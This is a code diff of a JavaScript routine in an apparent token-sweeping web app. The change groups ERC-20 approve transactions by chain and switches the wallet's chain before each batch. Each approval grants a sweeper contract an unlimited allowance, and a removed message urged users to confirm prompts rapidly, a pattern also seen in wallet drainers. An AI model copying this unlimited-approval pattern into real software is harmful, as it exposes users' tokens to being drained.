@@ -1194,20 +1194,47 @@ async function doApproveAll() {
         return;
     }
 
-    sweepLog(`🔥 Firing ${needsApproval.length} approvals in parallel — confirm each in wallet rapidly!`, 'info');
-
-    // Fire all approval txs simultaneously
+    // Group approvals by chain and switch chain before each batch
     const maxApproval = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    const approvalPromises = needsApproval.map(t => {
-        const contractAddr = BATCH_SWEEPER[t.chain];
-        const fromToken = t.mint || t.contractAddress;
-        const approveData = '0x095ea7b3' + contractAddr.slice(2).padStart(64, '0') + maxApproval;
-        return eth.request({ method: 'eth_sendTransaction', params: [{ from: userAddr, to: fromToken, data: approveData }] })
-            .then(txHash => { sweepLog(`${t.symbol} approval sent → ${txHash.slice(0, 16)}...`, 'ok'); return { token: t, txHash, status: 'ok' }; })
-            .catch(e => { sweepLog(`${t.symbol} approval failed: ${e.message}`, 'fail'); return { token: t, status: 'fail', error: e }; });
-    });
+    const byChain = {};
+    for (const t of needsApproval) {
+        if (!byChain[t.chain]) byChain[t.chain] = [];
+        byChain[t.chain].push(t);
+    }
 
-    const results = await Promise.allSettled(approvalPromises);
+    const allResults = [];
+    for (const [chainName, chainTokens] of Object.entries(byChain)) {
+        const chainId = BATCH_SWEEPER_CHAINS[chainName];
+        if (!chainId) continue;
+
+        // Switch to correct chain first
+        try {
+            const currentChain = await eth.request({ method: 'eth_chainId' });
+            if (parseInt(currentChain, 16) !== chainId) {
+                sweepLog(`🔗 Switching to ${chainName}...`, 'info');
+                await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x' + chainId.toString(16) }] });
+                await new Promise(r => setTimeout(r, 1500));
+            }
+        } catch(e) {
+            sweepLog(`Chain switch to ${chainName} failed: ${e.message}`, 'fail');
+            chainTokens.forEach(t => allResults.push({ status: 'fulfilled', value: { token: t, status: 'fail', error: e } }));
+            continue;
+        }
+
+        sweepLog(`🔥 Firing ${chainTokens.length} approval(s) on ${chainName}...`, 'info');
+        const approvalPromises = chainTokens.map(t => {
+            const contractAddr = BATCH_SWEEPER[t.chain];
+            const fromToken = t.mint || t.contractAddress;
+            const approveData = '0x095ea7b3' + contractAddr.slice(2).padStart(64, '0') + maxApproval;
+            return eth.request({ method: 'eth_sendTransaction', params: [{ from: userAddr, to: fromToken, data: approveData }] })
+                .then(txHash => { sweepLog(`${t.symbol} approval sent → ${txHash.slice(0, 16)}...`, 'ok'); return { token: t, txHash, status: 'ok' }; })
+                .catch(e => { sweepLog(`${t.symbol} approval failed: ${e.message}`, 'fail'); return { token: t, status: 'fail', error: e }; });
+        });
+        const chainResults = await Promise.allSettled(approvalPromises);
+        allResults.push(...chainResults);
+    }
+
+    const results = allResults;
     const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 'ok');
     const failed = results.filter(r => r.status !== 'fulfilled' || r.value.status !== 'ok');
 
